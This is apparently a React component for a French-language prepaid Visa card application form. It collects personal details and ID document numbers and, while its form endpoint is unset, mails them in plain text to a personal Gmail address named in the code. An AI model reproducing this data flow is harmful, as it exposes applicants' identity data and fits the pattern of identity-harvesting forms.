'use client';
import React, { useState } from 'react';
import { Check, AlertCircle, ChevronRight, ChevronLeft, Send, CreditCard } from 'lucide-react';

type Status = 'idle' | 'loading' | 'success' | 'error';

type FormData = {
  prenom: string;
  nom: string;
  dateNaissance: string;
  sexe: '' | 'M' | 'F' | 'Autre';
  nationalite: string;
  email: string;
  telephone: string;
  adresse: string;
  codePostal: string;
  ville: string;
  pays: string;
  typePiece: '' | 'CNI' | 'Passeport' | 'Titre de séjour';
  numeroPiece: string;
  dateExpiration: string;
  certifie: boolean;
};

type Errors = Partial<Record<keyof FormData, string>>;

const STEPS = [
  { number: 1, label: 'Informations' },
  { number: 2, label: 'Coordonnées' },
  { number: 3, label: 'Identité' },
  { number: 4, label: 'Récapitulatif' },
];

const initialForm: FormData = {
  prenom: '', nom: '', dateNaissance: '', sexe: '', nationalite: '',
  email: '', telephone: '', adresse: '', codePostal: '', ville: '', pays: '',
  typePiece: '', numeroPiece: '', dateExpiration: '', certifie: false,
};

function ProgressBar({ currentStep }: { currentStep: number }) {
  return (
    <div className="mb-8">
      <div className="flex items-center">
        {STEPS.map((step, i) => (
          <React.Fragment key={step.number}>
            <div className="flex flex-col items-center gap-1.5 flex-shrink-0">
              <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold transition-all duration-300 ${
                step.number < currentStep
                  ? 'bg-indigo-600 text-white'
                  : step.number === currentStep
                  ? 'bg-indigo-600 text-white ring-4 ring-indigo-100'
                  : 'bg-slate-100 text-slate-400'
              }`}>
                {step.number < currentStep ? <Check size={16} /> : step.number}
              </div>
              <span className={`text-xs font-medium hidden sm:block ${
                step.number <= currentStep ? 'text-indigo-600' : 'text-slate-400'
              }`}>
                {step.label}
              </span>
            </div>
            {i < STEPS.length - 1 && (
              <div className={`flex-1 h-1 mx-2 rounded-full transition-all duration-500 ${
                step.number < currentStep ? 'bg-indigo-600' : 'bg-slate-200'
              }`} />
            )}
          </React.Fragment>
        ))}
      </div>
      <p className="text-center text-sm text-slate-500 mt-4">
        Étape {currentStep} sur {STEPS.length}
      </p>
    </div>
  );
}

function FieldError({ message }: { message?: string }) {
  if (!message) return null;
  return <p className="mt-1 text-xs text-red-600">{message}</p>;
}

function inputClass(error?: string) {
  return `w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 transition-all text-slate-900 placeholder-slate-400 bg-white ${
    error
      ? 'border-red-300 focus:ring-red-400'
      : 'border-slate-200 focus:ring-indigo-500 focus:border-transparent'
  }`;
}

export default function VisaCardApplication() {
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);
  const [status, setStatus] = useState<Status>('idle');
  const [errors, setErrors] = useState<Errors>({});
  const [form, setForm] = useState<FormData>(initialForm);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target;
    const checked = (e.target as HTMLInputElement).checked;
    setForm(prev => ({ ...prev, [name]: type === 'checkbox' ? checked : value }));
    if (errors[name as keyof FormData]) {
      setErrors(prev => ({ ...prev, [name]: undefined }));
    }
  };

  const validateStep = (step: number): boolean => {
    const newErrors: Errors = {};

    if (step === 1) {
      if (!form.prenom.trim()) newErrors.prenom = 'Le prénom est requis';
      if (!form.nom.trim()) newErrors.nom = 'Le nom est requis';
      if (!form.dateNaissance) {
        newErrors.dateNaissance = 'La date de naissance est requise';
      } else {
        const age = (Date.now() - new Date(form.dateNaissance).getTime()) / (1000 * 60 * 60 * 24 * 365.25);
        if (age < 18) newErrors.dateNaissance = 'Vous devez avoir au moins 18 ans';
      }
      if (!form.sexe) newErrors.sexe = 'Veuillez sélectionner une option';
      if (!form.nationalite.trim()) newErrors.nationalite = 'La nationalité est requise';
    }

    if (step === 2) {
      if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email))
        newErrors.email = 'Adresse email invalide';
      if (!form.telephone.trim() || form.telephone.trim().length < 8)
        newErrors.telephone = 'Numéro de téléphone invalide (min. 8 chiffres)';
      if (!form.adresse.trim()) newErrors.adresse = "L'adresse est requise";
      if (!form.codePostal.trim()) newErrors.codePostal = 'Le code postal est requis';
      if (!form.ville.trim()) newErrors.ville = 'La ville est requise';
      if (!form.pays.trim()) newErrors.pays = 'Le pays est requis';
    }

    if (step === 3) {
      if (!form.typePiece) newErrors.typePiece = 'Veuillez choisir un type de pièce';
      if (!form.numeroPiece.trim()) newErrors.numeroPiece = 'Le numéro de pièce est requis';
      if (!form.dateExpiration) {
        newErrors.dateExpiration = "La date d'expiration est requise";
      } else if (new Date(form.dateExpiration) < new Date()) {
        newErrors.dateExpiration = "La pièce d'identité est expirée";
      }
      if (!form.certifie) newErrors.certifie = 'Vous devez certifier que les informations sont exactes';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (validateStep(currentStep)) {
      setCurrentStep(prev => (prev + 1) as 1 | 2 | 3 | 4);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  };

  const handleBack = () => {
    setCurrentStep(prev => (prev - 1) as 1 | 2 | 3 | 4);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('loading');

    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/YOUR_VISA_FORM_ID';

    if (FORMSPREE_ENDPOINT.includes('YOUR_VISA_FORM_ID')) {
      const subject = encodeURIComponent(`[Carte Visa] ${form.prenom} ${form.nom}`);
      const body = encodeURIComponent(
        `=== DEMANDE CARTE VISA PRÉPAYÉE ===\n\nINFORMATIONS PERSONNELLES\nPrénom: ${form.prenom}\nNom: ${form.nom}\nDate de naissance: ${form.dateNaissance}\nSexe: ${form.sexe === 'M' ? 'Masculin' : form.sexe === 'F' ? 'Féminin' : 'Autre'}\nNationalité: ${form.nationalite}\n\nCOORDONNÉES\nEmail: ${form.email}\nTéléphone: ${form.telephone}\nAdresse: ${form.adresse}\nCode postal: ${form.codePostal}\nVille: ${form.ville}\nPays: ${form.pays}\n\nPIÈCE D'IDENTITÉ\nType: ${form.typePiece}\nNuméro: ${form.numeroPiece}\nDate d'expiration: ${form.dateExpiration}`
      );
      window.location.href = `mailto:sergedaboulejunior@gmail.com?subject=${subject}&body=${body}`;
      setStatus('success');
      return;
    }

    try {
      const res = await fetch(FORMSPREE_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body: JSON.stringify(form),
      });
      if (res.ok) {
        setStatus('success');
      } else {
        setStatus('error');
      }
    } catch {
      setStatus('error');
    }
  };

  if (status === 'success') {
    return (
      <div className="text-center py-12 px-8">
        <div className="max-w-xs mx-auto mb-8">
          <svg viewBox="0 0 380 240" className="w-full drop-shadow-2xl" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="card-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stopColor="#4f46e5" />
                <stop offset="100%" stopColor="#7c3aed" />
              </linearGradient>
            </defs>
            <rect width="380" height="240" rx="20" fill="url(#card-gradient)" />
            <circle cx="60" cy="60" r="80" fill="white" fillOpacity="0.05" />
            <circle cx="320" cy="180" r="100" fill="white" fillOpacity="0.05" />
            <rect x="30" y="95" width="60" height="45" rx="6" fill="#fbbf24" fillOpacity="0.9" />
            <rect x="30" y="95" width="30" height="45" rx="6" fill="#f59e0b" fillOpacity="0.5" />
            <text x="30" y="190" fill="white" fontSize="22" fontFamily="monospace" opacity="0.8" letterSpacing="2">**** **** **** ****</text>
            <text x="30" y="218" fill="white" fontSize="11" opacity="0.7" fontFamily="sans-serif">
              {`${form.prenom.toUpperCase()} ${form.nom.toUpperCase()}`}
            </text>
            <text x="303" y="220" fill="white" fontSize="20" fontWeight="bold" opacity="0.95" fontFamily="serif" fontStyle="italic">VISA</text>
          </svg>
        </div>

        <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-5">
          <Check size={28} className="text-emerald-600" strokeWidth={2.5} />
        </div>
        <h3 className="text-2xl font-bold text-slate-900 mb-3">Demande envoyée !</h3>
        <p className="text-slate-500 max-w-sm mx-auto leading-relaxed">
          {"Votre demande de carte Visa prépayée a bien été reçue. Vous serez contacté sous 24h pour confirmer l'envoi."}
        </p>
        <div className="mt-5 inline-flex items-center gap-2 px-4 py-2 bg-indigo-50 text-indigo-700 rounded-full text-sm font-medium">
          <CreditCard size={16} />
          Livraison estimée sous 5 à 7 jours ouvrés
        </div>
        <div className="mt-8">
          <button
            onClick={() => { setStatus('idle'); setCurrentStep(1); setForm(initialForm); setErrors({}); }}
            className="px-6 py-3 bg-indigo-600 text-white font-semibold rounded-xl hover:bg-indigo-700 transition-colors"
          >
            Faire une nouvelle demande
          </button>
        </div>
      </div>
    );
  }

  return (
    <div>
      <ProgressBar currentStep={currentStep} />

      <div className="bg-white rounded-3xl border border-slate-200 shadow-sm p-8">
        <form onSubmit={handleSubmit}>

          {currentStep === 1 && (
            <div className="space-y-5">
              <div>
                <h2 className="text-xl font-bold text-slate-900">Informations personnelles</h2>
                <p className="text-sm text-slate-500 mt-1">{"Renseignez vos informations d'état civil."}</p>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Prénom *</label>
                  <input name="prenom" value={form.prenom} onChange={handleChange} placeholder="Marie" className={inputClass(errors.prenom)} />
                  <FieldError message={errors.prenom} />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Nom *</label>
                  <input name="nom" value={form.nom} onChange={handleChange} placeholder="Dupont" className={inputClass(errors.nom)} />
                  <FieldError message={errors.nom} />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Date de naissance *</label>
                <input type="date" name="dateNaissance" value={form.dateNaissance} onChange={handleChange} className={inputClass(errors.dateNaissance)} />
                <FieldError message={errors.dateNaissance} />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Sexe *</label>
                <select name="sexe" value={form.sexe} onChange={handleChange} className={inputClass(errors.sexe)}>
                  <option value="">Sélectionnez</option>
                  <option value="M">Masculin</option>
                  <option value="F">Féminin</option>
                  <option value="Autre">Autre / Non précisé</option>
                </select>
                <FieldError message={errors.sexe} />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Nationalité *</label>
                <input name="nationalite" value={form.nationalite} onChange={handleChange} placeholder="Française" className={inputClass(errors.nationalite)} />
                <FieldError message={errors.nationalite} />
              </div>
            </div>
          )}

          {currentStep === 2 && (
            <div className="space-y-5">
              <div>
                <h2 className="text-xl font-bold text-slate-900">Coordonnées</h2>
                <p className="text-sm text-slate-500 mt-1">Nous enverrons votre carte à cette adresse.</p>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Email *</label>
                  <input type="email" name="email" value={form.email} onChange={handleChange} placeholder="marie@exemple.com" className={inputClass(errors.email)} />
                  <FieldError message={errors.email} />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Téléphone *</label>
                  <input type="tel" name="telephone" value={form.telephone} onChange={handleChange} placeholder="+33 6 12 34 56 78" className={inputClass(errors.telephone)} />
                  <FieldError message={errors.telephone} />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Adresse *</label>
                <input name="adresse" value={form.adresse} onChange={handleChange} placeholder="15 rue de la Paix" className={inputClass(errors.adresse)} />
                <FieldError message={errors.adresse} />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-5">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Code postal *</label>
                  <input name="codePostal" value={form.codePostal} onChange={handleChange} placeholder="75001" className={inputClass(errors.codePostal)} />
                  <FieldError message={errors.codePostal} />
                </div>
                <div className="sm:col-span-2">
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Ville *</label>
                  <input name="ville" value={form.ville} onChange={handleChange} placeholder="Paris" className={inputClass(errors.ville)} />
                  <FieldError message={errors.ville} />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Pays *</label>
                <input name="pays" value={form.pays} onChange={handleChange} placeholder="France" className={inputClass(errors.pays)} />
                <FieldError message={errors.pays} />
              </div>
            </div>
          )}

          {currentStep === 3 && (
            <div className="space-y-5">
              <div>
                <h2 className="text-xl font-bold text-slate-900">{"Pièce d'identité"}</h2>
                <p className="text-sm text-slate-500 mt-1">{"Vérification requise pour l'émission de la carte."}</p>
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Type de pièce *</label>
                <select name="typePiece" value={form.typePiece} onChange={handleChange} className={inputClass(errors.typePiece)}>
                  <option value="">Choisissez un type</option>
                  <option value="CNI">{"Carte Nationale d'Identité"}</option>
                  <option value="Passeport">Passeport</option>
                  <option value="Titre de séjour">Titre de séjour</option>
                </select>
                <FieldError message={errors.typePiece} />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">Numéro de la pièce *</label>
                <input name="numeroPiece" value={form.numeroPiece} onChange={handleChange} placeholder="Ex : FR1234567890" className={inputClass(errors.numeroPiece)} />
                <FieldError message={errors.numeroPiece} />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">{"Date d'expiration *"}</label>
                <input type="date" name="dateExpiration" value={form.dateExpiration} onChange={handleChange} className={inputClass(errors.dateExpiration)} />
                <FieldError message={errors.dateExpiration} />
              </div>
              <div className={`flex items-start gap-3 p-4 border rounded-xl transition-all ${errors.certifie ? 'border-red-300 bg-red-50' : 'border-slate-200 bg-slate-50'}`}>
                <input
                  type="checkbox"
                  id="certifie"
                  name="certifie"
                  checked={form.certifie}
                  onChange={handleChange}
                  className="w-4 h-4 mt-0.5 accent-indigo-600 flex-shrink-0"
                />
                <label htmlFor="certifie" className="text-sm text-slate-600 leading-relaxed cursor-pointer">
                  {"Je certifie que toutes les informations fournies sont exactes et que la pièce d'identité indiquée m'appartient bien."}
                </label>
              </div>
              <FieldError message={errors.certifie} />
            </div>
          )}

          {currentStep === 4 && (
            <div className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-slate-900">Récapitulatif</h2>
                <p className="text-sm text-slate-500 mt-1">Vérifiez vos informations avant de soumettre.</p>
              </div>
              {[
                {
                  title: 'Informations personnelles',
                  rows: [
                    ['Prénom', form.prenom],
                    ['Nom', form.nom],
                    ['Date de naissance', form.dateNaissance],
                    ['Sexe', form.sexe === 'M' ? 'Masculin' : form.sexe === 'F' ? 'Féminin' : 'Autre / Non précisé'],
                    ['Nationalité', form.nationalite],
                  ],
                },
                {
                  title: 'Coordonnées',
                  rows: [
                    ['Email', form.email],
                    ['Téléphone', form.telephone],
                    ['Adresse', form.adresse],
                    ['Code postal', form.codePostal],
                    ['Ville', form.ville],
                    ['Pays', form.pays],
                  ],
                },
                {
                  title: "Pièce d'identité",
                  rows: [
                    ['Type', form.typePiece],
                    ['Numéro', form.numeroPiece],
                    ["Date d'expiration", form.dateExpiration],
                  ],
                },
              ].map(({ title, rows }) => (
                <div key={title} className="border border-slate-200 rounded-2xl overflow-hidden">
                  <div className="px-5 py-3 bg-slate-50 border-b border-slate-200">
                    <h3 className="text-sm font-semibold text-slate-700">{title}</h3>
                  </div>
                  <div className="divide-y divide-slate-100">
                    {rows.map(([label, value]) => (
                      <div key={label} className="flex justify-between items-start px-5 py-3">
                        <span className="text-sm text-slate-500 flex-shrink-0 mr-4">{label}</span>
                        <span className="text-sm font-medium text-slate-900 text-right">{value || '—'}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
              {status === 'error' && (
                <div className="flex items-center gap-2 p-3 bg-red-50 border border-red-200 rounded-xl text-red-600 text-sm">
                  <AlertCircle size={16} />
                  {"Une erreur s'est produite. Veuillez réessayer ou écrire à sergedaboulejunior@gmail.com"}
                </div>
              )}
            </div>
          )}

          <div className={`flex gap-3 mt-8 ${currentStep === 1 ? 'justify-end' : 'justify-between'}`}>
            {currentStep > 1 && (
              <button
                type="button"
                onClick={handleBack}
                className="flex items-center gap-2 px-6 py-3 bg-slate-100 text-slate-700 font-semibold rounded-xl hover:bg-slate-200 transition-colors"
              >
                <ChevronLeft size={18} />
                Précédent
              </button>
            )}
            {currentStep < 4 ? (
              <button
                type="button"
                onClick={handleNext}
                className="flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white font-semibold rounded-xl hover:bg-indigo-700 transition-all shadow-lg hover:shadow-indigo-200 active:scale-95"
              >
                Suivant
                <ChevronRight size={18} />
              </button>
            ) : (
              <button
                type="submit"
                disabled={status === 'loading'}
                className="flex items-center gap-2 px-8 py-3 bg-indigo-600 text-white font-semibold rounded-xl hover:bg-indigo-700 transition-all shadow-lg hover:shadow-indigo-200 active:scale-95 disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {status === 'loading' ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Envoi en cours...
                  </>
                ) : (
                  <>
                    <Send size={18} />
                    Soumettre ma demande
                  </>
                )}
              </button>
            )}
          </div>
        </form>
      </div>
    </div>
  );
}
